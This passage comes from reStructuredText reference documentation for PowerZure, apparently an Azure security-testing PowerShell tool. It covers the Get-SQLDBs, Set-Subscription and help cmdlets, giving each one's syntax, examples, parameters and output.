**Parameters** 


None

.. _required-modules-45:

**Required Modules**


Azure CLI

.. _**Output**-43:

**Output**


List of VMs and details

**Get-SQLDBs** 
~~~~~~~~~~~~~~

.. _**Synopsis**-44:

**Synopsis**


Lists the available SQL Databases on a server

.. _permissions-27:

Permissions


.. _****Syntax****-44:

****Syntax****



::

  Get-SQLDBs

.. _**Description**-44:

**Description**


Lists the available SQL Databases on a server. There currently are no
cmdlets in any PS module to interact with said DBs, so the only option
is to login via portal and use the preview browser.

.. _**Examples**-44:

**Examples**



::

  Get-SQLDBs

.. _**Parameters**-44:

**Parameters** 


None

.. _required-modules-46:

**Required Modules**


Azure CLI

.. _**Output**-44:

**Output**


List of SQL Databases in the subscription

Mandatory
---------

**Set-Subscription**
---------------~~~~~

.. _**Synopsis**-45:

**Synopsis**


Sets default subscription. Necessary if in a tenant with multiple
subscriptions.

.. _permissions-28:

Permissions


.. _****Syntax****-45:

****Syntax****



::

  Set-Subscription -Id [Subscription ID]

.. _**Description**-45:

**Description**


Sets the default subscription

.. _**Examples**-45:

**Examples**



::

  Set-Subscription -Id b049c906-7000-4899-b644-f3eb835f04d0

.. _**Parameters**-45:

**Parameters** 


-Id

Subscription ID

.. _required-modules-47:

**Required Modules**


Azure CLI

.. _**Output**-45:

**Output**


Success message

Help
----

**PowerZure**
~~~~~~~~~~~~~

.. _**Synopsis**-46:

**Synopsis**


Displays info about this script.

.. _permissions-29:

Permissions


.. _****Syntax****-46:

****Syntax****



::

  PowerZure -h

.. _**Description**-46:

**Description**


Displays info about this script.

.. _**Examples**-46:

**Examples**



::

  PowerZure -h

.. _**Parameters**-46:

**Parameters** 


-h

Help

.. _required-modules-48:

**Required Modules**


Azure CLI

.. _**Output**-46:

**Output**


List of functions in this script